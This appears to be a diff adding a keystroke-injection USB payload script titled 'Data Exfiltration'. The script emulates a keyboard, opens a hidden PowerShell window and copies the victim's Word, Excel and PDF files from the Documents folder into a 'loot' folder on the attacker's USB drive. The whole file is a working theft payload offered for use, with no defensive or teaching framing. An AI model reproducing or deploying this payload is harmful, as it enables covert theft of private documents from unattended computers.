@@ -1,0 +1,19 @@
+#!/bin/bash
+# Data Exfiltration
+# Author: bad-antics
+
+LED SETUP
+ATTACKMODE HID STORAGE
+
+LED ATTACK
+QUACK DELAY 1000
+QUACK GUI r
+QUACK DELAY 500
+QUACK STRING powershell -w hidden
+QUACK ENTER
+QUACK DELAY 1000
+QUACK STRING Copy-Item $env:USERPROFILE\Documents\*.docx,*.xlsx,*.pdf (Get-Volume -FileSystemLabel 'YOURNAME').DriveLetter + ':\loot\'
+QUACK ENTER
+
+LED FINISH
+sync
